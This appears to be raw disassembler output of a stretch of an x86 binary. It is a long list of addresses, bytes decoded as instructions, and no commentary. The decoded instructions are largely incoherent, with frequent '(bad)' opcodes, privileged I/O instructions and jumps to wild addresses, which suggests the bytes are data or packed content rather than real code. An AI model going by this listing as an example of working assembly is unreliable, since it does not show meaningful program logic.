  427b79:	fadd   DWORD PTR [eax+0x75]
  427b7c:	inc    eax
  427b7d:	pop    eax
  427b7e:	lea    ebx,[ecx+0x4f]
  427b81:	push   0xb1000003
  427b86:	out    dx,eax
  427b87:	add    ebp,DWORD PTR [edx+edx*2]
  427b8a:	add    BYTE PTR [ebx+ecx*4],bh
  427b8d:	mov    ch,BYTE PTR [ebx]
  427b8f:	jb     0x427c03
  427b91:	add    al,0x89
  427b93:	push   eax
  427b94:	call   0x842ac906
  427b99:	add    DWORD PTR [eax+eax*1],eax
  427b9c:	jae    0x427bb2
  427b9e:	icebp  
  427b9f:	inc    ebp
  427ba0:	mov    eax,DWORD PTR gs:[ecx]
  427ba3:	int3   
  427ba4:	out    dx,al
  427ba5:	loopne 0x427bf4
  427ba7:	sub    eax,DWORD PTR [edx]
  427ba9:	push   0xffffff83
  427bab:	pop    esi
  427bac:	push   cs
  427bad:	jl     0x427bc8
  427baf:	add    al,0xaf
  427bb1:	xor    eax,0x832b6d00
  427bb6:	mov    eax,DWORD PTR [edx]
  427bb8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  427bbe:	ror    DWORD PTR [ebx+0x7dc8e803],1
  427bc4:	inc    ebp
  427bc5:	shr    ebx,0x3
  427bc8:	or     DWORD PTR [eax],0x4
  427bcb:	push   0xffffffa5
  427bcd:	pop    esi
  427bce:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  427bd5:	jmp    0x427c34
  427bd7:	mov    edi,0xff0272
  427bdc:	fdivr  QWORD PTR [ebp+0x5d]
  427bdf:	push   0x4e
  427be1:	pop    ecx
  427be2:	call   0x42bfe7
  427be7:	mov    DWORD PTR [ebx],eax
  427be9:	in     al,0xc8
  427beb:	rol    BYTE PTR [ebp-0x75],0xc1
  427bef:	call   0xac7dd0
  427bf4:	pop    esi
  427bf5:	enter  0xceff,0x8b
  427bf9:	repz mov ecx,DWORD PTR [ebp-0x34]
  427bfd:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  427c04:	je     0x427c06
  427c06:	or     DWORD PTR [ebx-0x74183b24],eax
  427c0c:	jne    0x427bf2
  427c0e:	jmp    0x427c09
  427c10:	push   DWORD PTR [edx-0x24]
  427c13:	push   0x4d
  427c15:	pop    ecx
  427c16:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  427c1a:	jge    0x427c22
  427c1c:	mov    eax,eax
  427c1e:	sub    ebp,DWORD PTR [edx+0x24]
  427c21:	pop    esi
  427c22:	inc    ebp
  427c23:	mov    esp,0x8b6077
  427c28:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  427c2e:	lods   al,BYTE PTR ds:[esi]
  427c2f:	add    BYTE PTR [ebx],bh
  427c31:	enter  0xce73,0x49
  427c35:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  427c3d:	stc    
  427c3e:	jge    0x427cb2
  427c40:	jnp    0xdd41ffaf
  427c46:	call   0xc57d1c
  427c4b:	fadd   st(0),st
  427c4d:	dec    esi
  427c4e:	ins    BYTE PTR es:[edi],dx
  427c4f:	stc    
  427c50:	cmp    al,0x73
  427c52:	push   ebp
  427c53:	mov    eax,0xf8028b
  427c58:	jne    0x427c1b
  427c5a:	mov    esi,ecx
  427c5c:	mov    esp,DWORD PTR [ebp+0x2c]
  427c5f:	add    edi,DWORD PTR [ebp-0x24]
  427c62:	sub    esp,eax
  427c64:	and    al,0x45
  427c66:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  427c6c:	sbb    al,0xee
  427c6e:	pop    esi
  427c6f:	call   0x827c9f
  427c74:	fsubr  st,st(3)
  427c76:	sti    
  427c77:	add    BYTE PTR gs:[ecx],bh
  427c7a:	add    eax,esp
  427c7c:	add    DWORD PTR [esi],eax
  427c7e:	rol    DWORD PTR [ebp+0x8],0x29
  427c82:	mov    esp,eax
  427c84:	clc    
  427c85:	jne    0x427cfc
  427c87:	mov    eax,0x8b0673
  427c8c:	loopne 0x427cd3
  427c8e:	loopne 0x427c19
  427c90:	lods   al,BYTE PTR ds:[esi]
  427c91:	int3   
  427c92:	inc    ebp
  427c93:	mov    DWORD PTR gs:[eax+edi*8],eax
  427c97:	add    al,0xc3
  427c99:	sub    ecx,DWORD PTR [ebp+0x47]
  427c9c:	(bad)  
  427c9e:	shr    BYTE PTR [ebp-0x1f],0xe8
  427ca2:	add    eax,DWORD PTR [eax]
  427ca4:	call   0x6443da9
  427ca9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  427caf:	dec    esi
  427cb0:	ins    DWORD PTR es:[edi],dx
  427cb1:	in     al,dx
  427cb2:	lea    eax,[eax]
  427cb4:	inc    ebp
  427cb5:	inc    ebp
  427cb6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  427cbc:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  427cc6:	and    al,0xdc
  427cc8:	ror    DWORD PTR [edx+0x24],0xf7
  427ccc:	or     BYTE PTR [ebp+0x4c],dh
  427ccf:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  427cd3:	stos   BYTE PTR es:[edi],al
  427cd4:	adc    edx,edi
  427cd6:	inc    esp
  427cd7:	add    edi,DWORD PTR [eax]
  427cd9:	jne    0x427cbe
  427cdb:	mov    DWORD PTR [eax-0x7449db04],ecx
  427ce1:	cmp    ecx,DWORD PTR [edi]
  427ce3:	sub    BYTE PTR [ebp-0x7e],dl
  427ce6:	sar    ebp,0xb
  427ce9:	jmp    FWORD PTR [edi+0x2400392a]
  427cef:	sub    esi,DWORD PTR [ebx-0x73]
  427cf2:	mov    esp,DWORD PTR [ecx+edi*4]
  427cf5:	mov    ecx,DWORD PTR [eax]
  427cf7:	and    BYTE PTR [eax],al
  427cf9:	jne    0x427cc5
  427cfb:	sub    ebp,ecx
  427cfd:	sbb    BYTE PTR [esi+0x32],ah
  427d00:	dec    ebp
  427d01:	push   ebp
  427d02:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  427d08:	ret    
  427d09:	mov    edx,ebp
  427d0b:	leave  
  427d0c:	sub    DWORD PTR [esi+0x24],ebx
  427d0f:	ret    0x2b
  427d12:	pop    ax
  427d14:	push   ebp
  427d15:	rol    BYTE PTR [ebx],0xeb
  427d18:	add    DWORD PTR [ecx+0x6c0001],0x40
  427d1f:	jb     0x427d76
  427d21:	ret    
  427d22:	in     al,dx
  427d23:	jecxz  0x427cb0
  427d25:	push   esi
  427d26:	xchg   esp,eax
  427d27:	jne    0x427d29
  427d29:	cmp    edx,DWORD PTR [esi+0x1c]
  427d2c:	jne    0x427d12
  427d2e:	mov    eax,DWORD PTR [ebp-0x77]
  427d31:	ror    DWORD PTR [ebx+0x899408],0xe0
  427d38:	mov    esi,DWORD PTR [ebp-0x75]
  427d3b:	pop    esi
  427d3c:	nop
  427d3d:	mov    eax,DWORD PTR [eax]
  427d3f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  427d45:	add    al,0x0
  427d47:	inc    ebp
  427d48:	mov    eax,DWORD PTR [ebx]
  427d4a:	mov    ebp,ebx
  427d4c:	cmp    al,0xf
  427d4e:	or     al,al
  427d50:	inc    ebp
  427d51:	inc    ebp
  427d52:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  427d58:	cld    
  427d59:	add    BYTE PTR [edi+0x506c16c0],dh
  427d5f:	add    BYTE PTR [ecx-0x5],dl
  427d62:	add    eax,0x17200
  427d67:	sbb    al,0x85
  427d69:	dec    esp
  427d6a:	je     0x427da4
  427d6c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  427d70:	add    BYTE PTR [ebx],bh
  427d72:	(bad)  
  427d73:	and    al,0x39
  427d75:	jae    0x427d13
  427d77:	mov    cl,cl
  427d79:	inc    DWORD PTR [esp]
  427d7c:	push   ebp
  427d7d:	shr    esp,0x8
  427d80:	in     al,dx
  427d81:	push   esp
  427d82:	add    DWORD PTR [eax],esp
  427d84:	add    bl,cl
  427d86:	inc    ebp
  427d87:	mov    bh,0x89
  427d89:	add    ah,bh
  427d8b:	jmp    0xca7b8cd5
  427d90:	pushf  
  427d91:	dec    esp
  427d92:	mov    edx,0xf8178520
  427d97:	fst    DWORD PTR [ebp+0x0]
  427d9a:	mov    BYTE PTR [eax],0xc4
  427d9d:	sub    edx,DWORD PTR [ebx-0x3f]
  427da0:	inc    ebp
  427da1:	add    eax,0xc601dc
  427da6:	mov    al,0xc6
  427da9:	ins    BYTE PTR es:[edi],dx
  427daa:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  427db1:	dec    esp
  427db2:	jmp    DWORD PTR [eax]
  427db4:	inc    ebp
  427db5:	fnstcw WORD PTR [eax+0x29]
  427db8:	test   BYTE PTR [eax],0xc5
  427dbb:	rol    BYTE PTR [eax],0xc0
  427dbe:	lea    ecx,[ebp-0x3cf0dbcb]
  427dc4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  427dca:	inc    esi
  427dcb:	add    DWORD PTR [eax],ebx
  427dcd:	add    dh,bh
  427dcf:	mov    esi,DWORD PTR [edx+0x8]
  427dd2:	(bad)  
  427dd3:	fdiv   QWORD PTR ss:[ecx]
  427dd6:	(bad)  
  427dd7:	mov    bl,ch
  427dd9:	add    esi,eax
  427ddb:	add    dh,bl
  427ddd:	or     esi,eax
  427ddf:	mov    dl,0xdf
  427de1:	add    esi,eax
  427de3:	add    al,ah
  427de5:	push   cs
  427de6:	mov    BYTE PTR [edx+0xc601e1],0xe2
  427ded:	or     BYTE PTR [ebx],dh
  427def:	dec    ecx
  427df0:	lea    eax,[ebx]
  427df2:	xor    eax,0x18fc0fc7
  427df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427df8:	repz clc 
  427dfa:	add    eax,DWORD PTR [ebp+0x46]
  427dfd:	prefetcht0 BYTE PTR [ecx-0x2]
  427e01:	xor    eax,0x7c60872
  427e06:	mov    esp,0xbd32c698
  427e0b:	pop    esi
  427e0c:	mov    cl,0xbe
  427e0f:	or     al,0xc6
  427e11:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  427e18:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  427e1f:	add    dh,al
  427e21:	mov    eax,ebx
  427e23:	xor    DWORD PTR [ebx],0x35008dbc
  427e29:	mov    ecx,DWORD PTR [edi]
  427e2b:	sbb    al,0x18
  427e2d:	inc    ebp
  427e2e:	xrelease mov DWORD PTR [ebx],0x188546f4
  427e35:	clc    
  427e36:	(bad)  
  427e37:	cmp    BYTE PTR [edx-0x64],dh
  427e3a:	lea    ecx,[ecx+0x45ffe838]
  427e40:	mov    ecx,esp
  427e42:	fadd   st,st(6)
  427e44:	dec    ebp
  427e45:	lds    edi,FWORD PTR [eax+0x7145fc56]
  427e4b:	out    0x1,eax
  427e4d:	inc    ebp
  427e4e:	lea    ebp,ds:0xc8ffc6ff
  427e54:	enter  0xa33,0xc6
  427e58:	push   ebp
  427e59:	leave  
  427e5a:	(bad)  
  427e5b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  427e61:	add    BYTE PTR [ebp+0x44],al
  427e64:	mov    eax,esp
  427e66:	mov    WORD PTR [esi+0x43398300],?
  427e6c:	psubusw mm4,QWORD PTR [eax-0x78]
  427e70:	add    BYTE PTR [ebx-0x1303f975],al
  427e76:	add    BYTE PTR [ebp+0x1],0xf3
  427e7a:	add    BYTE PTR [ebp+0x38],al
  427e7d:	in     eax,dx
  427e7e:	inc    ebp
  427e7f:	inc    ebp
  427e80:	mov    esp,ebx
  427e82:	add    BYTE PTR [ebp+0x0],0xee
  427e86:	mov    DWORD PTR [ebp-0x48],eax
  427e89:	sub    eax,0x2e00454f
  427e8e:	js     0x427ed5
  427e90:	data16 js 0x427e18
  427e93:	idiv   bh
  427e95:	inc    esp
  427e96:	(bad)  
  427e97:	fadd   st(7),st
  427e99:	mov    dh,0x89
  427e9b:	and    DWORD PTR [esi+0x43],0xffffffff
  427e9f:	fld    DWORD PTR [ebx-0x767cc078]
  427ea5:	pop    es
  427ea6:	push   0x8d45ffec
  427eab:	in     eax,dx
  427eac:	inc    DWORD PTR [ebp-0x77]
  427eaf:	loopne 0x427f1b
  427eb1:	inc    ebp
  427eb2:	jmp    esp
  427eb4:	add    DWORD PTR [ebp+0x11],0xfffffff1
  427eb8:	mov    DWORD PTR [ebp+0x6c],eax
  427ebb:	(bad)  
  427ebd:	inc    ebp
  427ebe:	(bad)  
  427ebf:	call   0xe7cbc3d0
  427ec4:	outs   dx,BYTE PTR ds:[esi]
  427ec5:	inc    ebp
  427ec6:	(bad)  
  427ec7:	js     0x427e4c
  427ec9:	div    BYTE PTR ds:0x70bc8944
  427ecf:	mov    dh,0xff
  427ed1:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  427ed8:	jb     0x427e5d
  427eda:	dec    DWORD PTR [eax]
  427edc:	mov    ebp,esp
  427ede:	test   WORD PTR [ebp-0x1],ax
  427ee5:	inc    ebp
  427ee6:	ror    BYTE PTR [ebx-0x117a279a],0xff
  427eed:	adc    edi,edi
  427eef:	mov    ecx,esi
  427ef1:	mov    eax,DWORD PTR [eax]
  427ef3:	cmp    BYTE PTR [esi-0x1],ah
  427ef6:	test   DWORD PTR [ebx],edi
  427ef8:	push   DWORD PTR [ebp-0x1]
  427efb:	mov    DWORD PTR [esi-0x48],ebp
  427efe:	add    BYTE PTR [ebp+0x66],al
  427f01:	jmp    0x427e88
  427f03:	pushf  
  427f04:	dec    DWORD PTR [ebx-0x7f9c0301]
  427f0a:	add    BYTE PTR [ecx],al
  427f0c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  427f13:	add    al,al
  427f15:	add    BYTE PTR [esi+0x45],ah
  427f18:	test   DWORD PTR [ebx+0xff7cff],ecx
  427f1e:	dec    esp
  427f1f:	mov    DWORD PTR [eax],eax
  427f21:	mov    esp,DWORD PTR [esi-0x4]
  427f24:	inc    ebp
  427f25:	cmp    BYTE PTR [eax+0x4701],0x38
  427f2c:	mov    DWORD PTR [ecx-0x7e],esp
  427f2f:	add    BYTE PTR [edi-0x73],al
  427f32:	push   0xffffffd1
  427f34:	mov    WORD PTR [ebp+0x64],ax
  427f38:	(bad)  
  427f39:	call   eax
  427f3b:	mov    esp,eax
  427f3d:	data16 icebp 
  427f3f:	test   DWORD PTR [ebp-0x1],eax
  427f42:	(bad)  
  427f44:	out    0xc0,eax
  427f46:	lea    esp,[esi-0x30]
  427f49:	test   DWORD PTR [edx+0x43ff80ff],ecx
  427f4f:	inc    edi
  427f50:	jmp    0x75ff:0x40858866
  427f57:	dec    DWORD PTR [ebp-0x7a992f40]
  427f5d:	test   esi,edi
  427f5f:	(bad)  
  427f60:	(bad)  
  427f61:	inc    DWORD PTR [ebp-0x9901b9]
  427f67:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  427f6d:	rcl    BYTE PTR [ecx+0x66],0x33
  427f71:	test   DWORD PTR [ebx+0xff72ff],edi
  427f77:	inc    edi
  427f78:	ret    
  427f79:	mov    ax,WORD PTR [ebp-0x3f0004]
  427f80:	push   eax
  427f81:	mov    DWORD PTR [ebp-0x77],0xff98748b
  427f88:	add    BYTE PTR [ebx-0x764ff439],al
  427f8e:	push   DWORD PTR [esi+0x1]
  427f91:	inc    DWORD PTR [eax]
  427f93:	mov    eax,0xff99ff
  427f98:	or     BYTE PTR [ecx-0x7a87bb],cl
  427f9e:	jne    0x427f58
  427fa0:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  427faa:	mov    ecx,0xd74fb8
  427faf:	add    cl,al
  427fb1:	mov    DWORD PTR [ecx-0x3f007784],ecx
  427fb7:	or     DWORD PTR [ebx+0x558966ec],0x7e
  427fbe:	(bad)  
  427fbf:	push   ebp
  427fc1:	mov    eax,0x8c2789
  427fc6:	ret    0x6689
  427fc9:	adc    BYTE PTR [ebp+0x4c],0x8d
  427fcd:	add    bl,bl
  427fcf:	mov    WORD PTR [ebp-0x70],ax
  427fd3:	(bad)  
  427fd4:	ret    0x660d
  427fd7:	or     BYTE PTR [ebp-0x77],dl
  427fda:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  427fe1:	in     al,0x89
  427fe3:	(bad)  
  427fe4:	xchg   esi,eax
  427fe5:	aam    0xcf
  427fe7:	call   0x45daf875
  427fec:	dec    edx
  427fed:	pop    ecx
  427fee:	mov    edx,DWORD PTR [eax]
  427ff0:	repnz push bp
  427ff3:	or     BYTE PTR [ebx+0x5510663b],0x49
  427ffa:	(bad)  
  427ffb:	repnz xor eax,0xa0898945
  428001:	mov    ah,0x89
  428003:	jmp    DWORD PTR [edx+0x66b0418d]
  428009:	inc    DWORD PTR [ebp+0x50]
  42800c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428010:	mov    DWORD PTR [eax],ecx
  428012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428013:	pop    es
  428014:	inc    ecx
  428015:	(bad)  
  428016:	cbw    
  428018:	inc    ebp
  428019:	xor    ah,BYTE PTR [esi+0x3]
  42801c:	dec    ebp
  42801d:	push   eax
  42801e:	inc    bp
  428020:	jge    0x427fa5
  428022:	mov    esp,DWORD PTR [esi-0x18]
  428025:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  42802b:	add    DWORD PTR [ebx],esi
  42802d:	add    BYTE PTR [ebx],al
  42802f:	test   DWORD PTR [ebx],esi
  428031:	(bad)  
  428032:	inc    WORD PTR [ebp+0x0]
  428036:	mov    eax,DWORD PTR [eax]
  428038:	call   0x8898376d
  42803d:	mov    esi,eax
  42803f:	clc    
  428040:	ret    
  428041:	rol    cl,0xa
  428044:	mov    DWORD PTR ds:0x7c0ec88,esi
  42804a:	mov    edx,edi
  42804c:	pushf  
  42804d:	pop    es
  42804e:	jmp    FWORD PTR [edx+0x66]
  428051:	add    BYTE PTR [ebp-0x990175],al
  428057:	inc    ebp
  428058:	test   DWORD PTR [ebx-0x2f000202],eax
  42805e:	push   ebp
  42805f:	mov    edi,eax
  428061:	mov    dh,BYTE PTR [eax+0x266ff51]
  428067:	push   ebp
  428068:	add    BYTE PTR [ebx-0x764b1777],al
  42806e:	dec    DWORD PTR [esi+0x661851e8]
  428074:	add    BYTE PTR [ebp-0x7b],dl
  428077:	cmp    esi,0xfffffffb
  42807a:	dec    DWORD PTR [ecx+0x51fe9285]
  428080:	jmp    DWORD PTR [esi-0x75]
  428083:	push   ebp
  428084:	hlt    
  428085:	data16 (bad) 
  428087:	dec    ebp
  428088:	ret    
  428089:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42808f:	lea    edx,[eax-0x1]
  428092:	jne    0x428065
  428094:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42809a:	dec    BYTE PTR [ecx+0x51559eff]
  4280a0:	mov    DWORD PTR [esi-0x4c],esp
  4280a3:	push   ebp
  4280a4:	jmp    DWORD PTR [esi-0x18]
  4280a7:	inc    ebp
  4280a8:	sbb    BYTE PTR [ebp-0x767ae500],cl
  4280ae:	(bad)  
  4280af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280b0:	inc    eax
  4280b2:	test   DWORD PTR [esi-0x2],esp
  4280b5:	inc    ebp
  4280b6:	dec    DWORD PTR [ebp-0x760bde75]
  4280bc:	(bad)  
  4280bd:	test   al,0xc3
  4280bf:	mov    DWORD PTR [ebp-0x769b56],ecx
  4280c5:	lods   al,BYTE PTR ds:[esi]
  4280c6:	push   eax
  4280c7:	inc    ebp
  4280c8:	jne    0x4280d9
  4280ca:	dec    DWORD PTR [ebp+0x8]
  4280cd:	mov    eax,DWORD PTR [edi]
  4280cf:	sbb    al,0x0
  4280d1:	(bad)  
  4280d2:	mov    eax,0xc14fc3
  4280d7:	mov    DWORD PTR [eax-0x64],edi
  4280da:	inc    bp
  4280dc:	test   DWORD PTR [edi],ecx
  4280de:	dec    DWORD PTR [ebp-0x1]
  4280e1:	xor    eax,edi
  4280e3:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4280e9:	inc    ebp
  4280ea:	xor    DWORD PTR [ebx],0x3f
  4280ed:	mov    WORD PTR [ebp-0x1bc],ax
  4280f4:	lea    ecx,[ecx-0x767702]
  4280fa:	inc    esi
  4280fb:	(bad)  
  4280fc:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428103:	pushf  
  428104:	rol    DWORD PTR [ebp-0x72019a],0xff
  42810b:	add    bh,bh
  42810d:	add    BYTE PTR [edi],cl
  42810f:	test   DWORD PTR [eax],eax
  428111:	(bad)  
  428112:	dec    WORD PTR [ebp-0xff002d]
  428119:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42811d:	jmp    DWORD PTR [esi-0x73]
  428120:	lea    esi,[eax+0x50ffffff]
  428126:	fadd   QWORD PTR [ebp+0x0]
  428129:	xor    esp,DWORD PTR [esi+0x3]
  42812c:	lea    edx,[eax-0x1]
  42812f:	test   edi,edi
  428131:	dec    DWORD PTR [ebp-0x1]
  428134:	mov    edi,edi
  428136:	dec    eax
  428137:	clc    
  428138:	call   DWORD PTR [ebp-0x73]
  42813b:	lea    esi,[eax+0x51ffff88]
  428141:	lea    ecx,[ebp-0x78]
  428144:	test   WORD PTR [ebp-0x2],ax
  42814b:	popf   
  42814c:	push   eax
  42814d:	add    BYTE PTR [ecx-0x77],dl
  428150:	xor    edi,DWORD PTR [eax-0x7236007d]
  428156:	cwde   
  428157:	mov    al,0x32
  428159:	inc    DWORD PTR [ebx]
  42815b:	push   eax
  42815c:	push   ecx
  42815d:	inc    ebp
  42815e:	shl    BYTE PTR [ebx],1
  428160:	lea    eax,[ebx]
  428162:	call   DWORD PTR [eax-0x1]
  428165:	test   DWORD PTR [ebx],esi
  428167:	inc    DWORD PTR [eax-0x1]
  42816a:	(bad)  
  42816b:	(bad)  
  42816c:	(bad)  
  42816d:	clc    
  42816e:	call   DWORD PTR [ebp+0x50]
  428171:	jmp    0xcb82eb
  428176:	inc    esp
  428177:	jnp    0x428178
  428179:	add    BYTE PTR [ecx-0x484f73],cl
  42817f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428185:	mov    eax,DWORD PTR [ecx]
  428187:	data16 add BYTE PTR [ebp-0xb50077],al
  42818e:	inc    eax
  428190:	lea    esp,[esi+0x14]
  428193:	test   DWORD PTR [ecx-0xb301],ecx
  428199:	inc    edi
  42819a:	(bad)  
  42819b:	dec    si
  42819d:	test   edi,edi
  42819f:	(bad)  
  4281a0:	cmp    eax,0xc74f73ff
  4281a5:	mov    edx,DWORD PTR [edx-0x7d]
  4281a8:	push   DWORD PTR [ebx+0x56328939]
  4281ae:	(bad)  
  4281af:	call   FWORD PTR [esi-0x47]
  4281b2:	inc    DWORD PTR ds:0x893c00ea
  4281b8:	(bad)  
  4281b9:	pop    eax
  4281ba:	mov    ah,0xff
  4281bc:	(bad)  
  4281bd:	mov    ecx,0x5745
  4281c2:	dec    DWORD PTR [ecx-0xf7a501]
  4281c8:	(bad)  
  4281c9:	mov    ecx,0x456108
  4281ce:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4281d4:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4281da:	inc    BYTE PTR gs:[eax]
  4281dd:	inc    DWORD PTR [ebp-0x73]
  4281e0:	cmp    dh,bh
  4281e2:	pushf  
  4281e3:	inc    edi
  4281e5:	mov    ebx,eax
  4281e7:	hlt    
  4281e8:	test   DWORD PTR [ecx-0xbab708],ecx
  4281ee:	cmp    al,0xbe
  4281f0:	pushf  
  4281f1:	or     bh,al
  4281f3:	pop    es
  4281f4:	lock into 
  4281f6:	test   eax,eax
  4281f8:	clc    
  4281f9:	mov    ebx,0x387245
  4281fe:	lahf   
  4281ff:	retf   
  428200:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428206:	add    edi,edi
  428208:	add    BYTE PTR [ecx+0x45],dl
  42820b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428212:	mov    edx,DWORD PTR [ecx-0x74]
  428215:	inc    DWORD PTR [eax]
  428217:	cld    
  428218:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42821e:	add    BYTE PTR [ebp-0x1b0177],al
  428224:	jge    0x42826b
  428226:	test   DWORD PTR [ebx+0xff9875],ecx
  42822c:	sbb    BYTE PTR [esi+0x55],ah
  42822f:	xchg   ebp,eax
  428230:	call   0x427d34
  428235:	push   edi
  428236:	inc    ebp
  428237:	mov    dx,WORD PTR [ebp-0xfc0075]
  42823e:	cmp    al,0x85
  428240:	ud0    eax,DWORD PTR [ebp-0x1]
  428244:	test   DWORD PTR [edi+0x74],ecx
  428247:	dec    edi
  428248:	inc    DWORD PTR [ebp-0xf70004]
  42824e:	dec    DWORD PTR [edi-0x75]
  428251:	dec    edi
  428252:	cld    
  428253:	test   DWORD PTR [eax+0xff01ff],eax
  428259:	icebp  
  42825a:	add    BYTE PTR [edi-0x3a],cl
  42825d:	test   ebx,eax
  42825f:	inc    BYTE PTR [ebp-0x1]
  428262:	jne    0x428264
  428264:	mov    eax,DWORD PTR [eax]
  428266:	cld    
  428267:	xor    BYTE PTR [ecx+0x500155],cl
  42826d:	push   ebp
  42826e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428274:	add    BYTE PTR [ebp+0x35e90f50],al
  42827a:	add    al,BYTE PTR [eax]
  42827c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428282:	add    ah,ch
  428284:	or     BYTE PTR [ebp+0x4501f845],dh
  42828a:	jmp    0xde8587
  42828f:	(bad)  
  428290:	nop    ecx
  428293:	test   DWORD PTR [ebp+0x4502f8],eax
  428299:	cmp    cl,BYTE PTR [ebp-0x64]
  42829c:	mov    eax,edi
  42829e:	mov    ebx,DWORD PTR [eax+edx*2]
  4282a1:	add    eax,0x45fef885
  4282a6:	dec    DWORD PTR [ebx+0x339445]
  4282ac:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4282b2:	dec    DWORD PTR [ebx-0x460f0375]
  4282b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b9:	add    esi,edi
  4282bb:	add    bh,bh
  4282bd:	rdpmc  
  4282bf:	add    BYTE PTR [ebx],0x1
  4282c2:	mov    DWORD PTR [eax],eax
  4282c4:	add    al,0x45
  4282c6:	dec    DWORD PTR [ecx-0x360b3373]
  4282cc:	dec    DWORD PTR [esi]
  4282ce:	push   eax
  4282cf:	jne    0x428316
  4282d1:	mov    esi,DWORD PTR [ebx]
  4282d3:	cld    
  4282d4:	add    ebp,ebx
  4282d6:	push   eax
  4282d7:	inc    DWORD PTR [ebp-0x75]
  4282da:	add    eax,0x800e4
  4282df:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4282e5:	mov    DWORD PTR [ecx],eax
  4282e7:	sbb    al,0x0
  4282e9:	leave  
  4282ea:	test   DWORD PTR [edi-0x2],eax
  4282ed:	jne    0x4282ee
  4282ef:	call   0xff436df4
  4282f4:	xor    BYTE PTR [ebp+0x4d],al
  4282f7:	mov    edi,edi
  4282f9:	enter  0x8,0x4d
  4282fd:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428303:	mov    eax,DWORD PTR [eax]
  428305:	cld    
  428306:	add    DWORD PTR [ecx],ebx
  428308:	inc    ebp
  428309:	dec    ebp
  42830a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428310:	inc    eax
  428311:	dec    DWORD PTR [ecx-0x270375]
  428317:	add    BYTE PTR [ebx-0x39d72701],cl
  42831d:	xchg   ecx,eax
  42831e:	ret    
  42831f:	add    BYTE PTR [ebp-0x830075],al
  428325:	add    BYTE PTR [ebp-0x75],al
  428328:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  42832e:	lea    edi,[edi-0xc]
  428331:	add    bh,bh
  428333:	mov    edx,DWORD PTR [eax-0x7b]
  428336:	inc    ebp
  428337:	rdpmc  
  428339:	jne    0x42833e
  42833b:	add    BYTE PTR [eax-0x75],dl
  42833e:	inc    ebp
  42833f:	clc    
  428340:	add    eax,0x400009
  428345:	mov    DWORD PTR [ebx-0x7f000304],ecx
  42834b:	mov    eax,DWORD PTR [ecx]
  42834d:	in     al,dx
  42834e:	add    dh,al
  428350:	test   ebx,eax
  428352:	inc    BYTE PTR [ebp-0xff0001]
  428358:	add    BYTE PTR [ebp-0x43],al
  42835b:	cmp    esi,0xfffffff8
  42835e:	(bad)  
  42835f:	push   DWORD PTR [eax]
  428361:	add    BYTE PTR [ebp-0x3a],dl
  428364:	test   ebx,eax
  428366:	je     0x4282ed
  428368:	mov    edi,edi
  42836a:	sbb    al,0xff
  42836c:	test   DWORD PTR gs:[eax],eax
  42836f:	(bad)  
  428370:	js     0x428371
  428372:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428378:	sub    eax,ebx
  42837a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428380:	add    eax,DWORD PTR [eax]
  428382:	dec    ebp
  428383:	push   eax
  428384:	mov    al,BYTE PTR [ebp+0x1]
  428387:	mov    eax,DWORD PTR [ebp-0x68]
  42838a:	mov    eax,DWORD PTR [eax]
  42838c:	sbb    bh,al
  42838e:	or     ah,dh
  428390:	dec    ebp
  428391:	inc    DWORD PTR [eax+0x4]
  428394:	push   ecx
  428395:	add    BYTE PTR [edx-0x1],dh
  428398:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42839e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4283a8:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4283ae:	push   ecx
  4283af:	cmp    BYTE PTR [ebx],al
  4283b1:	inc    ebp
  4283b2:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4283b8:	(bad)  
  4283b9:	(bad)  
  4283ba:	in     al,0xff
